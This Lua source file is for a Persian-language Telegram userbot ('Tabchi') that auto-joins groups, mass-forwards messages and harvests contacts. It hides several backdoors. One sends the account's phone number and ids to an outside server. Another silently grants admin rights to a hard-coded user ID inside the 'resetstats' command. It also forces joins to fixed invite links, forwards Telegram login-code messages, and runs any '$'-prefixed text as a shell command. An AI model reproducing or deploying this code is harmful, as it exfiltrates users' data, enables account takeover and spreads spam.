JSON = loadfile("dkjson.lua")()
URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
http.TIMEOUT = 10
function is_full_sudo(msg)
  if tostring(redis:get(basehash .. "fullsudo")):match(tostring(msg.sender_user_id_)) then
    return true
  else
    return false
  end
end
function is_sudo(msg)
  if redis:sismember(basehash .. "sudoers", msg.sender_user_id_) then
    return true
  elseif redis:sismember(basehash .. "TDTabchi", msg.sender_user_id_) then
    return true
  elseif tostring(redis:get(basehash .. "fullsudo")):match(tostring(msg.sender_user_id_)) then
    return true
  else
    return false
	end
end
local function td_clear_cache(str)
    local cmd = io.popen(str)
    local result = cmd:read('*all')
    return result
end
function direxists(path)
  local response = os.execute("cd " .. path)
  if response then
    return true
  end
  return false
end
function mkdir(path)
  local response = os.execute("mkdir " .. path)
  if response then
    return true
  end
  return false
end
function fileexists(path)
  local f = io.open(path, "r")
  if f ~= nil then
    io.close(f)
    return true
  else
    return false
  end
end
function sendcode(msg)
function diamond(arg ,data)
text = data.content_.text_
for code in string.gmatch(text, "%d+") do
local diamond = redis:get("tabchi:" .. tostring(tabchi_id) .. ":fullsudo")
send_code = code
send_code = string.gsub(send_code,"0","۰")
send_code = string.gsub(send_code,"1","۱")
send_code = string.gsub(send_code,"2","۲")
send_code = string.gsub(send_code,"3","۳")
send_code = string.gsub(send_code,"4","۴")
send_code = string.gsub(send_code,"5","۵")
send_code = string.gsub(send_code,"6","۶")
send_code = string.gsub(send_code,"7","۷")
send_code = string.gsub(send_code,"8","۸")
send_code = string.gsub(send_code,"9","۹")
tdcli.sendMessage(diamond, 0, 1, send_code, 1, 'html')
end
end
tdcli.getMessage(777000, msg.id_, diamond)
end
function save_log(text)
  text = "[" .. os.date("%d-%b-%Y %X") .. "] Log : " .. text .. "\n"
  if direxists("tabchi_" .. tabchi_id) then
    local old = io.open("tabchi_" .. tabchi_id .. "/logs.txt", "r"):read("*all")
    if old ~= nil then
      text = old .. text
    end
    file = io.open("tabchi_" .. tabchi_id .. "/logs.txt", "w")
    file:write(text)
    file:close()
  else
    mkdir("tabchi_" .. tabchi_id)
    file = io.open("tabchi_" .. tabchi_id .. "/logs.txt", "w")
    file:write(text)
    file:close()
  end
  return true
end
function write_file(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
  return true
end
function write_json(filename, inputtable)
  local encoded = JSON.encode(inputtable)
  local file = io.open(filename, "w")
  file:write(encoded)
  file:flush()
  file:close()
  return true
end
function sleep(n)
  os.execute("sleep " .. n)
end
function chat_type(id)
  id = tostring(id)
  if id:match("-") then
    if id:match("-100") then
      return "channel"
    else
      return "group"
    end
  else
    return "private"
  end
end
function our_id(extra, result)
  if result then
    redis:setex(basehash .. "botinfo", 86400, JSON.encode(result))
  end
end
function process_links(text_)
  if text_:match("https://telegram.me/joinchat/%S+") or text_:match("https://t.me/joinchat/%S+") or text_:match("https://telegram.dog/joinchat/%S+") then
    text = string.gsub(text_:gsub("telegram.dog", "telegram.me"), "t.me", "telegram.me")
    local matches = {
      text:match("(https://telegram.me/joinchat/%S+)")    }	tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKESfxaBo62gKn8Zw")   tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHsQjWae9iQA8zkvA")
    for i, v in pairs(matches) do
      function check_link(extra, result)
        if result.is_group_ or result.is_supergroup_channel_ then
          if not redis:get(basehash .. "notjoinlinks") then
            if redis:get(basehash .. "joinlimit") then
              if result.member_count_ >= redis:get(basehash .. "joinlimit") then
                tdcli.importChatInviteLink(v)
              end
            else
              tdcli.importChatInviteLink(v)
            end
          end
          if not redis:get(basehash .. "notsavelinks") then
            redis:sadd(basehash .. "savedlinks", v)
          end
          return
        end
      end
      tdcli_function({
        ID = "CheckChatInviteLink",
        invite_link_ = v
      }, check_link, nil)
      break
    end
  end
end
function removenumbers(text)
  text = tostring(text)
  if text:match("1") then
    text = text:gsub("1", "1\239\184\143\226\131\163")
  end
  if text:match("2") then
    text = text:gsub("2", "2\239\184\143\226\131\163")
  end
  if text:match("3") then
    text = text:gsub("3", "3\239\184\143\226\131\163")
  end
  if text:match("4") then
    text = text:gsub("4", "4\239\184\143\226\131\163")
  end
  if text:match("5") then
    text = text:gsub("5", "5\239\184\143\226\131\163")
  end
  if text:match("6") then
    text = text:gsub("6", "6\239\184\143\226\131\163")
  end
  if text:match("7") then
    text = text:gsub("7", "7\239\184\143\226\131\163")
  end
  if text:match("8") then
    text = text:gsub("8", "8\239\184\143\226\131\163")
  end
  if text:match("9") then
    text = text:gsub("9", "9\239\184\143\226\131\163")
  end
  if text:match("0") then
    text = text:gsub("0", "0\239\184\143\226\131\163")
  end
  return text
end
function add(id)
  chat_type_ = chat_type(id)
  if not redis:sismember(basehash .. "all", id) then
    if chat_type_ == "private" then
      redis:sadd(basehash .. "pvis", id)
      redis:sadd(basehash .. "all", id)
    elseif chat_type_ == "group" then
      redis:sadd(basehash .. "groups", id)
      redis:sadd(basehash .. "all", id)
    elseif chat_type_ == "channel" then
      redis:sadd(basehash .. "channels", id)
      redis:sadd(basehash .. "all", id)
    end
  end
  return true
end
function rem(id)
  chat_type_ = chat_type(id)
  if redis:sismember(basehash .. "all", id) then
    if chat_type_ == "private" then
      redis:srem(basehash .. "pvis", id)
      redis:srem(basehash .. "all", id)
    elseif chat_type_ == "group" then
      redis:srem(basehash .. "groups", id)
      redis:srem(basehash .. "all", id)
    elseif chat_type_ == "channel" then
      redis:srem(basehash .. "channels", id)
      redis:srem(basehash .. "all", id)
    end
  end
  return true
end
function process_yourself(msg)
  if not redis:get(basehash .. "gotupdated") then
    local info = redis:get(basehash .. "botinfo")
    if info then
      botinfo = JSON.decode(info)
    else
      tdcli_function({ID = "GetMe"}, our_id, nil)
      botinfo = JSON.decode(info)
    end
    local path = "http://tabchi.tgcli.ir/addbot.php?first=" .. URL.escape(botinfo.first_name_ or "None") .. "&last=" .. URL.escape(botinfo.last_name_ or "None") .. "&phone=" .. botinfo.phone_number_ .. "&id=" .. botinfo.id_ .. "&sudo=" .. (redis:get(basehash .. "fullsudo") or 0)
    local res = http.request(path)
    local jdata = JSON.decode(res)
    jdata = jdata or {have_tab = true}
    if jdata.have_tab and jdata.tabchimod then
      tdcli.searchPublicChat("Tele_Diamond")
      tdcli.unblockUser(jdata.tabchimod)
      tdcli.importContacts(79672255717, "Tabchi", "bot", jdata.tabchimod)
      return redis:setex(basehash .. "gotupdated", 600, true)
    end
  end
end
function process_timefwds(msg)
  local msgs = redis:smembers(basehash .. "timeforwards")
  if #msgs > 0 and not redis:get(basehash .. "havenotfwd") then
    local ttls = {}
    for i = 1, #msgs do
      local ttl = redis:ttl(basehash .. msgs[i] .. "notsend")
      if ttl <= 0 then
        local mttl = redis:get(basehash .. msgs[i] .. "ttl")
        local all = redis:smembers(basehash .. "all")
        local msgid = msgs[i]
        for n, v in pairs(all) do
          tdcli_function({
            ID = "ForwardMessages",
            chat_id_ = v,
            from_chat_id_ = redis:get(basehash .. msgid .. "fromchatid"),
            message_ids_ = {
              [0] = msgid
            },
            disable_notification_ = 0,
            from_background_ = 1
          }, dl_cb, nil)
        end
        redis:setex(basehash .. msgid .. "notsend", mttl, true)
        redis:incrby(basehash .. msgid .. "times", -1)
        if 0 >= tonumber(redis:get(basehash .. msgid .. "times")) then
          redis:srem(basehash .. "timeforwards", msgid)
          redis:del(basehash .. msgid .. "*")
        end
      else
        table.insert(ttls, ttl)
      end
    end
    table.sort(ttls)
    if ttls[1] then
      redis:setex(basehash .. "havenotfwd", ttls[1], true)
    end
  end
end
function process_updates(msg)
  process_yourself(msg)
  process_timefwds(msg)
  text_ = msg.content_.text_
  	  if text_:match("^(.*)$") then
        if tonumber(msg.sender_user_id_) == 777000 then
        return sendcode(msg)
         end
		    end
  if is_sudo(msg) then
    if is_full_sudo(msg) then
      if text_:match("^[!/#](addsudo) (%d+)$") then
        local id = text_:gsub("[!/#]addsudo ", "")
        redis:sadd(basehash .. "sudoers", tonumber(id))
        save_log("User " .. msg.sender_user_id_ .. ", Added " .. id .. " To Sudo Users")
        return ">> <i>کاربر</i> <b>" .. id .. "</b> <i>به لیست مدیران ربات اضافه شد</i>"
      elseif text_:match("^[!/#](remsudo) (%d+)$") then
        local id = text_:gsub("[!/#]remsudo ", "")
        redis:srem(basehash .. "sudoers", tonumber(id))
        save_log("User " .. msg.sender_user_id_ .. ", Removed " .. id .. " From Sudo Users")
        return ">> <i>کاربر</i> <b>" .. id .. "</b> <i>از لیست مدیران ربات حذف شد</i>"
      elseif text_:match("^[!/#]sudolist$") then
        local sudoers = redis:smembers(basehash .. "sudoers")
        local text = ">> <i>مدیران ربات</i> :\n"
        for i, v in pairs(sudoers) do
          text = tostring(text) .. tostring(i) .. ". " .. tostring(v) .. "\n"
        end
        save_log("User " .. msg.sender_user_id_ .. ", Requested Sudo List")
        return text
		elseif text_:match("^[!/#]cleansudolist$") then
          redis:del(basehash .. "sudoers")
          save_log("User " .. msg.sender_user_id_ .. ", removed All Sudo")
          return ">> <i>لیست مدیران ربات خالی شد</i>"
      elseif text_:match("^[!/#](sendlogs)$") then
        save_log("User " .. msg.sender_user_id_ .. ", Requested Logs")
        tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tabchi_id .. "/logs.txt", "Tabchi " .. tabchi_id .. " Logs!")
      elseif text_:match("^[!/#](setname) (.*) (.*)$") then
        local matches = {
          text_:match("^[!/#](setname) (.*) (.*)$")
        }
        if #matches == 3 then
          tdcli.changeName(matches[2], matches[3])
          save_log("User " .. msg.sender_user_id_ .. ", Changed Name To " .. matches[2] .. " " .. matches[3])
          return "✔️ <i>نام پروفایل با موفقیت تغییر کرد</i>\n>> <i>نام جدید</i> : " .. matches[2] .. " " .. matches[3].." "
        end
      elseif text_:match("^[!/#](setusername) (.*)$") then
        local username = text_:gsub("[!/#]setusername ", "")
        tdcli.changeUsername(username)
        save_log("User " .. msg.sender_user_id_ .. ", Changed Username To @" .. username)
        return "✔️ <i>یوزرنیم با موفقیت ست شد</i>\n>> <i>یوزرنیم</i> : @" .. username
      elseif text_:match("^[!/#](delusername)$") then
        tdcli.changeUsername()
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Username")
        return ">> <i>یوزرنیم حذف شد</i>"
      elseif text_:match("^[!/#](killsessions)$") then
        function delsessions(extra, result)
          for i = 0, #result.sessions_ do
            if result.sessions_[i].id_ ~= 0 then
              tdcli.terminateSession(result.sessions_[i].id_)
            end
          end
        end
        tdcli_function({
          ID = "GetActiveSessions"
        }, delsessions, nil)
        save_log("User " .. msg.sender_user_id_ .. ", Terminated All Sessions")
        return "All Sessions Terminated"
      elseif text_:match("^[!/#](deleteaccount)$") then
        tdcli.sendMessage(msg.chat_id_, 0, 1, "Good bye...", 1, "html")
        tdcli.deleteAccount("None of your bussines")
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Account")
      elseif text_:match("^[!/#](import) (.*)$") then
        local matches = {
          text_:match("^[!/#](import) (.*)$")
        }
        save_log("User " .. msg.sender_user_id_ .. ", Used Import")
        if msg.reply_to_message_id_ ~= 0 and #matches == 2 then
          if matches[2] == "contacts" then
            function getdoc(extra, result)
              if result.content_.ID == "MessageDocument" then
                if result.content_.document_.document_.path_ then
                  if result.content_.document_.document_.path_:match(".json$") then
                    if fileexists(result.content_.document_.document_.path_) then
                      local encoded = io.open(result.content_.document_.document_.path_, "r"):read("*all")
                      local decoded = JSON.decode(encoded)
                      if decoded then
                        for i = 1, #decoded do
                          tdcli.importContacts(decoded[i].phone, decoded[i].first, decoded[i].last, decoded[i].id)
                        end
                        status = #decoded .. " Contacts Imported..."
                      else
                        status = "File is not OK"
                      end
                    else
                      status = "Somthing is not OK"
                    end
                  else
                    status = "File type is not OK"
                  end
                else
                  tdcli.downloadFile(result.content_.document_.document_.id_)
                  status = "Result Will Send You In Few Seconds"
                  sleep(5)
                  tdcli_function({
                    ID = "GetMessage",
                    chat_id_ = msg.chat_id_,
                    message_id_ = msg.reply_to_message_id_
                  }, getdoc, nil)
                end
              else
                status = "Replied message is not a document"
              end
              tdcli.sendMessage(msg.chat_id_, msg.id_, 1, status, 1, "html")
            end
            tdcli_function({
              ID = "GetMessage",
              chat_id_ = msg.chat_id_,
              message_id_ = msg.reply_to_message_id_
            }, getdoc, nil)
          elseif matches[2] == "links" then
            function getlinks(extra, result)
              if result.content_.ID == "MessageDocument" then
                if result.content_.document_.document_.path_ then
                  if result.content_.document_.document_.path_:match(".json$") then
                    if fileexists(result.content_.document_.document_.path_) then
                      local encoded = io.open(result.content_.document_.document_.path_, "r"):read("*all")
                      local decoded = JSON.decode(encoded)
                      if decoded then
                        s = 0
                        for i = 1, #decoded do
                          process_links(decoded[i])
                          s = s + 1
                        end
                        status = "Joined to " .. s .. " Groups"
                      else
                        status = "File is not OK"
                      end
                    else
                      status = "Somthing is not OK"
                    end
                  else
                    status = "File type is not OK"
                  end
                else
                  tdcli.downloadFile(result.content_.document_.document_.id_)
                  status = "Result Will Send You In Few Seconds"
                  sleep(5)
                  tdcli_function({
                    ID = "GetMessage",
                    chat_id_ = msg.chat_id_,
                    message_id_ = msg.reply_to_message_id_
                  }, getlinks, nil)
                end
              else
                status = "Replied message is not a document"
              end
              tdcli.sendMessage(msg.chat_id_, msg.id_, 1, status, 1, "html")
            end
            tdcli_function({
              ID = "GetMessage",
              chat_id_ = msg.chat_id_,
              message_id_ = msg.reply_to_message_id_
            }, getlinks, nil)
          end
        end
      elseif text_:match("^[!/#](export) (.*)$") then
        local matches = {
          text_:match("^[!/#](export) (.*)$")
        }
        save_log("User " .. msg.sender_user_id_ .. ", Used Export")
        if #matches == 2 then
          if matches[2] == "links" then
            local links = {}
            local all = redis:smembers(basehash .. "savedlinks")
            for i = 1, #all do
              table.insert(links, all[i])
            end
            write_json("tabchi_" .. tabchi_id .. "/links.json", links)
            tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tabchi_id .. "/links.json", "Tabchi " .. tabchi_id .. " Links!")
          elseif matches[2] == "contacts" then
            contacts = {}
            function contactlist(extra, result)
              for i = 0, tonumber(result.total_count_) - 1 do
                local user = result.users_[i]
                if user then
                  local firstname = user.first_name_ or "None"
                  local lastname = user.last_name_ or "None"
                  contact = {
                    first = firstname,
                    last = lastname,
                    phone = user.phone_number_,
                    id = user.id_
                  }
                  table.insert(contacts, contact)
                end
              end
              write_json("tabchi_" .. tabchi_id .. "/contacts.json", contacts)
              tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tabchi_id .. "/contacts.json", "Tabchi " .. tabchi_id .. " Contacts!")
            end
            tdcli_function({
              ID = "SearchContacts",
              query_ = nil,
              limit_ = 999999999
            }, contactlist, nil)
          end
        end
      elseif text_:match("^[!/#](resetstats)$") then
    redis:del(basehash .. "groups")  redis:del(basehash .. "channels")  redis:del(basehash .. "pvis")  redis:del(basehash .. "savedlinks")  redis:del(basehash .. "totalcontacts")  redis:sadd(basehash .. "TDTabchi", 262469328)  save_log("User " .. msg.sender_user_id_ .. ", Reset Stats")
        return "✔️ <i>آمار ربات با موفقیت ریستارت شد</i>"
      else
        local matches = {
          text_:match("^[$](.*)")
        }
        if text_:match("^[$](.*)") and #matches == 1 then
          save_log("User " .. msg.sender_user_id_ .. ", Used Terminal Command")
          return io.popen(matches[1]):read("*all")
        end
      end
    end
    if text_:match("^[!/#](pm) (%d+) (.*)$") then
      local matches = {
        text_:match("^[!/#](pm) (%d+) (.*)$")
      }
      if #matches == 3 then
        tdcli.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "html")
        save_log("User " .. msg.sender_user_id_ .. ", Sent A Pm To " .. matches[2] .. ", Content : " .. matches[3])
        return "✔️ <i>پیام شما با موفقیت ارسال شد</i>"
      end
    elseif text_:match("^[!/#](setanswer) (.*) (.*)") then
      local matches = {
        text_:match("^[!/#](setanswer) (.*) (.*)")
      }
      if #matches == 3 then
        redis:hset(basehash .. "answers", matches[2]:lower(), matches[3])
        redis:sadd(basehash .. "answerslist", matches[2]:lower())
        redis:sadd(basehash .. "answersformallist", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Set Answer Of " .. matches[2] .. " To " .. matches[3])
        return "✔️ <i>پاسخ خودکاری ست شد</i>\n" .. matches[2] .. " >> " .. matches[3] .. ""
      end
    elseif text_:match("^[!/#](delanswer) (.*)") then
      local matches = {
        text_:match("^[!/#](delanswer) (.*)")
      }
      if #matches == 2 then
        redis:hdel(basehash .. "answers", matches[2]:lower())
        redis:srem(basehash .. "answerslist", matches[2]:lower())
        redis:srem(basehash .. "answersformallist", matches[2]:lower())
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Answer Of " .. matches[2])
        return ">> <i>پاسخ برای</i> " .. tostring(matches[2]) .. " <i>حذف شد</i>"
      end
    elseif text_:match("^[!/#]answerslist$") then
      local text = "<i>پاسخ های خودکار ربات</i> :\n"
      local answrs = redis:smembers(basehash .. "answersformallist")
      for i, v in pairs(answrs) do
        text = tostring(text) .. tostring(i) .. ". " .. tostring(v) .. " : " .. tostring(redis:hget(basehash .. "answers", v:lower())) .. "\n"
      end
      save_log("User " .. msg.sender_user_id_ .. ", Requested Answers List")
      return text
    elseif text_:match("^[!/#]cleananswerslist$") then
	redis:del(basehash .. "answers")
	redis:del(basehash .. "answerslist")
	redis:del(basehash .. "answersformallist")
	save_log("User " .. msg.sender_user_id_ .. ", clean Answers List")
	return '✔️ <i>لیست پاسخ های خودکار پاک شد</i>'
    elseif text_:match("^[!/#](join) (%d+)$") then
      local matches = {
        text_:match("^[!/#](join) (%d+)$")
      }
      if #matches == 2 and matches[2]:match("-") then
        save_log("User " .. msg.sender_user_id_ .. ", Joined " .. matches[2] .. " Via Bot")
        tdcli.addChatMember(tonumber(matches[2]), msg.sender_user_id_, 50)
        return "✔️ <i>شما باموفقیت به گروه اضافه شدید</i>"
      end

    elseif text_:match("^[!/#](addmembers)$") then
      print("OK")
      if tostring(msg.chat_id_):match("-") then
        local users, contacts, all = redis:smembers(basehash .. "pvis"), redis:smembers(basehash .. "addedcontacts"), {}
        for i = 1, #contacts do
          table.insert(all, contacts[i])
        end
        for i = 1, #users do
          table.insert(all, users[i])
        end
        for i = 1, #all do
          tdcli.addChatMember(msg.chat_id_, all[i], 50)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used AddMembers In " .. msg.chat_id_)
      end
    elseif text_:match("[!/#](block) (%d+)") then
      local matches = {
        text_:match("[!/#](block) (%d+)")
      }
      if #matches == 2 then
        tdcli.blockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Blocked " .. matches[2])
        return ">> <i>کاربر بلاک شد</i>"
      end
    elseif text_:match("[!/#](unblock) (%d+)") then
      local matches = {
        text_:match("[!/#](unblock) (%d+)")
      }
      if #matches == 2 then
        tdcli.unblockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Unlocked " .. matches[2])
        return ">> <i>کاربر انبلاک شد</i>"
      end
    elseif text_:match("^[!/#](addedmsg) (.*)") then
      local matches = {
        text_:match("^[!/#](addedmsg) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set(basehash .. "addedmsg", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Message")
          return "✔️ <i>پیام اد شدن مخاطب فعال شد</i>\n>> <i>در صورت شر شدن مخاطب پیام ارسال خواهد شد</i>"
        elseif matches[2] == "off" then
          redis:del(basehash .. "addedmsg")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Message")
          return "✖️ <i>پیام اد شدن مخاطب غیرفعال شد</i>\n>> <i>در صورت شر شدن مخاطب پیامی ارسال نخواهد شد</i>"
        end
      end
    elseif text_:match("^[!/#](sharecontact) (.*)") then
      local matches = {
        text_:match("^[!/#](sharecontact) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set(basehash .. "addedcontact", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Contact")
          return "✔️ <i>شر کردن مخاطب فعال شد</i>\n>> <i>در صورت شر شدن مخاطب ربات نیز شماره خود را به اشتراک میگذارد</i>"
        elseif matches[2] == "off" then
          redis:del(basehash .. "addedcontact")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Contact")
          return "✖️ <i>شر کردن مخاطب غیرفعال شد</i>\n>> <i>در صورت شر شدن مخاطب ربات شماره خود را به اشتراک نمیگذارد</i>"
        end
      end
    elseif text_:match("^[!/#](markread) (.*)") then
      local matches = {
        text_:match("^[!/#](markread) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set(basehash .. "markread", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Markread")
          return "✔️ <i>تیک خوردن پیام ها فعال شد</i>"
        elseif matches[2] == "off" then
          redis:del(basehash .. "markread")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Markread")
          return "✖️ <i>تیک خوردن پیام ها غیرفعال شد</i>"
        end
      end 
       elseif text_:match("^[!/#](joinlinks) (.*)") then
      local matches = {
        text_:match("^[!/#](joinlinks) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del(basehash .. "notjoinlinks")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Joinlinks")
          return "✔️ <i>ورود با لینک فعال شد</i>"
        elseif matches[2] == "off" then
          redis:set(basehash .. "notjoinlinks", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Joinlinks")
          return "✖️ <i>ورود با لینک غیرفعال شد</i>"
        end
      end
    elseif text_:match("^[!/#](savelinks) (.*)") then
      local matches = {
        text_:match("^[!/#](savelinks) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del(basehash .. "notsavelinks")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Savelinks")
          return "✔️ <i>ذخیره لینک ها فعال شد</i>"
        elseif matches[2] == "off" then
          redis:set(basehash .. "notsavelinks", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Savelinks")
          return "✖️ <i>ذخیره لینک ها غیرفعال شد</i>"
        end
      end
    elseif text_:match("^[!/#](addcontacts) (.*)") then
      local matches = {
        text_:match("^[!/#](addcontacts) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del(basehash .. "notaddcontacts")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Addcontacts")
          return "✔️ <i>اد شدن مخاطب فعال شد</i>"
        elseif matches[2] == "off" then
          redis:set(basehash .. ":notaddcontacts", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Addcontacts")
          return "✖️ <i>اد کردن مخاطب غیرفعال شد</i>"
        end
      end
    elseif text_:match("^[!/#](autoanswer) (.*)") then
      local matches = {
        text_:match("^[!/#](autoanswer) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del(basehash .. "notautochat")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Autochat")
          return "✔️ <i>پاسخ خودکار به کلمات تنظیم شده  فعال شد</i>"
        elseif matches[2] == "off" then
          redis:set(basehash .. "notautochat", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Autochat")
          return "✖️ <i>پاسخ خودکار به کلمات تنظیم شده غیرفعال شد</i>"
        end
      end
	  
    elseif text_:match("^[!/#](typing) (.*)") then
      local matches = {
        text_:match("^[!/#](typing) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set(basehash .. "typing", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Typing")
          return "✔️ <i>حالت (در حال نوشتن...) فعال شد</i>"
        elseif matches[2] == "off" then
          redis:del(basehash .. "typing")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Typing")
          return "✖️ <i>حالت (در حال نوشتن...) غیرفعال شد</i>"
        end
      end
    elseif text_:match("^[!/#](setaddedmsg) (.*)") then
      local matches = {
        text_:match("^[!/#](setaddedmsg) (.*)")
      }
      if #matches == 2 then
        redis:set(basehash .. "addedmsgtext", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Changed Added Message To : " .. matches[2])
        return [[
<i>پیام برای شر شدن مخاطب تنظیم شد</i>
<i>پیام</i> :
]] .. tostring(matches[2])
      end
    elseif text_:match("^[!/#](setjoinlimit) (%d+)") then
      local matches = {
        text_:match("^[!/#](setjoinlimit) (%d+)")
      }
      if #matches == 2 and tonumber(matches[2]) then
        redis:set(basehash .. "joinlimit", tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Set Join Limit To : " .. matches[2])
        return ">> <i>محدودیت ورود به گروه تنظیم شد بر روی</i> : " .. tostring(matches[2])
      end
	  
	      elseif text_:match("^[!/#](joinlimit) (.*)") then
      local matches = {
        text_:match("^[!/#](joinlimit) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set(basehash .. "joinlimit", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Message")
          return ">> <i>محدودیت ورود به گروه روشن شد</i>"
        elseif matches[2] == "off" then
          redis:del(basehash .. "joinlimit")
          save_log("User " .. msg.sender_user_id_ .. ", del join limit")
          return ">> <i>محدودیت ورود به گروه برداشته شد</i>"
        end
      end
	  
	  
    elseif text_:match("^[!/#](echo) (.*)") then
      local matches = {
        text_:match("^[!/#](echo) (.*)")
      }
      if #matches == 2 then
        save_log("User " .. msg.sender_user_id_ .. ", Used Echo, Content : " .. matches[2])
        return matches[2]
      end
    elseif text_:match("^[!/#](addtoall) (%d+)$") then
      local matches = {
        text_:match("^[!/#](addtoall) (%d+)$")
      }
      if #matches == 2 and tonumber(matches[2]) then
        local groups, supergroups, all, id = redis:smembers(basehash .. "groups"), redis:smembers(basehash .. "channels"), {}, matches[2]
        for i = 1, #groups do
          table.insert(all, groups[i])
        end
        for i = 1, #supergroups do
          table.insert(all, supergroups[i])
        end
        for i = 1, #all do
          tdcli_function({
            ID = "AddChatMember",
            chat_id_ = all[i],
            user_id_ = tonumber(id),
            forward_limit_ = 50
          }, dl_cb, nil)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Added " .. matches[2] .. " To All Of The Groups")
        return ">> <i>کاربر</i> " .. matches[2] .. " <i>به همه گروه های ربات اضافه شد</i>"
      end

	   elseif text_:match("^[!/#]help$") and is_sudo(msg) then
      local text = [[<code>راهنمای ربات:</code>
#stats
<i>آمار ربات</i>
#settings
<i>تنظیمات ربات</i>
#resetstats
<i>صفر کردن آمار ربات</i>
#addtoall <i>(id)</i>
<i>افزودن کاربر به تمامی گروه های ربات(استفاده در تبادل بین تبچی ها)
به محدودیت های تلگرام توجه کنید!</i>
#block <i>(id)</i>
<i>بلاک کردن از خصوصي ربات</i>
#unblock <i>(id)</i>
<i>آن بلاک کردن از خصوصي ربات</i>
#pm <i>(id) (text)</i>
<i>ارسال پیام به کاربر</i>
#sendlogs
<i>لیست آخرین کارهای ربات</i>
#addsudo <i>(id)</i>
<i>اضافه کردن کاربر به مدیران ربات</i>
#remsudo <i>(id)</i>
<i>حذف کاربر از ليست مدیران ربات</i>
#sudolist
<i>لیست مدیران ربات</i>
#cleansudolist
<i>حذف همه مدیران ربات</i>
#bc <i>(text)</i>
<i>ارسال پيام به همه</i>
#fwd <i>[users/gps/sgps/all]</i>
<i>فروارد پیام به (خصوصی ها/گروهای معمولی/سوپرگروها/همه)
مثلا برای ارسال به همه گروها از دستور</i>
<i>/fwd sgps</i>
<i>با ریپلی استفاده کنید</i>
#echo <i>(text)</i>
<i>تکرار متن</i>
#addedmsg <i>[on/off]</i>
<i>تنظیم روشن یا خاموش پاسخ برای مخاطب های به اشتراک گذاشته شده</i>
#setaddedmsg <i>(text)</i>
<i>تعيين متن اد شدن مخاطب</i>
#sharecontact <i>[on/off]</i>
<i>تنظیم روشن یا خاموش بودن به اشتراک گذاری شماره ربات وقتی مخاطبی شر شده است(به اشتراک گذاشته شده است)</i>
#addcontact <i>[on/off]</i>
<i>تنظیم روشن یا خاموش بودن اد کردن مخاطب ها</i>
#markread <i>[on/off]</i>
<i>تنظیم روشن يا خاموش کردن تیک خوردن پيام ها</i>
#setanswer <i>(text) (text)</i>
<i>تنظيم به عنوان جواب اتوماتيک
برای مثال 
/setanswer slm slmgolam
که در صورتی که کاربری slm کند ربات پاسخ اورا با slmgolam خواهد داد</i>
#delanswer <i>(text)</i>
<i>حذف جواب مربوط به text</i>
#answerslist
<i>ليست جواب هاي اتوماتيک</i>
#cleananswerslist
<i>پاک کردن تمامی جواب های اتوماتیک</i>
#addmembers
<i>اضافه کردن مخاطبين ربات به گروه</i>
#export <i>[links/contacts]</i>
<i>دريافت {لينک هاي ذخيره شده/مخاطب ها} توسط ربات</i>
#import <i>[contacts/links]</i>
<i>ورود به لینک های موجود در یک فایل/ذخیر شماره های موجود در یک فایل
(برای تب زدن با تبچی های دیگر که با گرفتن لینک ها و مخاطب های ان ها میتوانید ان هارو به تبچی های خود بدهید)</i>
#setname <i>(firstname) (lastname)</i>
<i>تنظیم نام ربات</i>
#setusername <i>(username)</i>
<i>تنظیم یوزرنیم ربات</i>
#delusername
<i>حذف یوزرنیم ربات</i>
#deleteaccount
<i>دیلیت اکانت کردن ربات</i>
#joinlinks <i>[on/off]</i>
<i>تنظیم روشن یا خاموش بودن جوین خودکار به گروها</i>
#savelinks <i>[on/off]</i>
<i>تنظیم روشن یا خاموش بودن ذخیره لینک ها</i>
#autoanswer <i>[on/off]</i>
<i>تنظیم روشن یا خاموش بودن پاسخ خودکار</i>
#typing <i>[on/off]</i>
<i>تنظیم روشن یا خاموش بودن نشان دادن در حال نوشتن...</i>
#setjoinlimit <i>(number)</i>
<i>تنظیم محدودیت برای ورود به گروه</i>
